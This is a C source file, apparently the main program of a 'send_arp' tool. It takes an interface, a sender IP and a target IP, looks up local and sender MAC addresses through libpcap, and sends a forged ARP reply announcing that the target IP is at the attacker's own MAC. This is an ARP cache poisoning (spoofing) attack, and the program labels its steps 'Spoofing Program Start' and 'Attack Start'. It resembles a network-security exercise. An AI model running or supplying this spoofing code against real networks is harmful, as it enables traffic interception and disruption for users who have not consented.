#include "send_arp.h"

int main(int argc, char** argv){
    pcap_t *handle;   /* Session handle */
    char *dev;  /* device to communication */
    char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */
    struct ether_addr MyMac;   /* my mac address */
    struct ether_addr SenderMac;
    struct in_addr MyIP, SenderIP, TargetIP;
    /* Check argument count */
    if(argc != 4){
        printf("usage : %s <interface> <sender ip> <target ip>\n",argv[0]);
        return -1;
    }
    if(inet_pton(AF_INET, argv[2], &SenderIP) != 1){
        printf("usage : %s <interface> <sender ip> <target ip>\n",argv[0]);
        return -1;
    }
    if(inet_pton(AF_INET, argv[3], &TargetIP) != 1){
        printf("usage : %s <interface> <sender ip> <target ip>\n",argv[0]);
        return -1;
    }
    /* Define device */
    dev = argv[1];

    printf("**********************************\n");
    printf("Spoofing Program Start!!\n");
    printf("Interface is %s\n",dev);
    printf("Sender IP is %s\n",inet_ntoa(SenderIP));
    printf("Target IP is %s\n",inet_ntoa(TargetIP));

    /* Open session in promiscuous mode */
    if( (handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf)) == NULL){
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return 2;
    }
    /* Get My IP addr */
    if(GetMyIP(&MyIP, dev) != 1){
        fprintf(stderr, "Couldn't get IPv4\n");
        return 2;
    }

    printf("My IP is %s\n",inet_ntoa(MyIP));

    printf("**********************************\n");
    printf("Get Local Mac Address...\n");

    if(GetMyMac(&MyMac, dev) != 1){
        fprintf(stderr, "Couldn't Get local Mac Address\n");
        return 2;
    }

    printf("Success!!\n");
    printf("Local Mac Address is %s\n",ether_ntoa(&MyMac));

    printf("**********************************\n");
    printf("Get Sender Mac Address...\n");

    if(GetSenderMac(handle, MyMac, MyIP, SenderIP, &SenderMac) != 1){
        fprintf(stderr, "Couldn't Get Sender Mac Address\n");
        return 2;
    }

    printf("Sender Mac Address is %s\n",ether_ntoa(&SenderMac));
    printf("**********************************\n");
    printf("Attack Start\n");
    printf("Generate Arp Reply Packet %s is at %s\n",inet_ntoa(TargetIP), ether_ntoa(&MyMac));

    if(AttackPacket(handle,SenderMac,MyMac,TargetIP,SenderIP) != 1){
        fprintf(stderr, "Couldn't Attack\n");
        return 2;
    }

    printf("Done!\n");
    return 0;
}
